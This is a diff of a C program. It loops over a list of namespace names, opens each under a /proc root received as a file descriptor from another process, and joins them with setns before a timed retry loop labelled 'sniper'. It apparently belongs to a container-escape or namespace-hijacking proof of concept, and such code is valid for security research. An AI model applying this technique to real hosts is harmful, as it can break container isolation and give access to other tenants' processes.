@@ -59,42 +59,26 @@ int main(int argc, char * argv[])
 	int remote_fd = recv_fd(cl);
     my_log("recved fd", remote_fd);
 
-    int user_ns = openat(remote_fd, "proc/10/ns/user", 0);
-    if (user_ns < 0)
+    char * NSS[] = {"user", "mnt", "pid", "uts", "ipc", "cgroup"};
+    char path[1024];
+    for (int i = 0; i < 6; i++)
     {
-        my_err("open user_ns");
-    }
-    int mnt_ns = openat(remote_fd, "proc/10/ns/mnt", 0);
-    if (mnt_ns < 0)
-    {
-        my_err("open mnt_ns");
-    }
-    int pid_ns = openat(remote_fd, "proc/10/ns/pid", 0);
-    if (pid_ns < 0)
-    {
-        my_err("open pid_ns");
-    }
-    my_log("set userns", 0);
-    int ret = setns(user_ns, CLONE_NEWUSER);
-    if (ret < 0)
-    {
-        my_err("setns user");
-    }
-    my_log("set mntns", 0);
-    ret = setns(mnt_ns, CLONE_NEWNS);
-    if (ret < 0)
-    {
-        my_err("setns mnt");
-    }
-    my_log("set pidns", 0);
-    ret = setns(pid_ns, CLONE_NEWPID);
-    if (ret < 0)
-    {
-        my_err("setns pid");
+        snprintf(path, 1024, "proc/10/ns/%s", NSS[i]);
+        my_log(NSS[i], 0);
+        int ns = openat(remote_fd, path, 0);
+        if (ns < 0)
+        {
+            my_err("openat");
+        }
+        int ret = setns(ns, 0);
+        if (ret < 0)
+        {
+            my_err("setns user");
+        }
     }
     report("sniper");
 
-    ret = -1;
+    int ret = -1;
     time_t start = time(NULL);
     while(ret < 0 && (time(NULL) - start) < 15)
     {
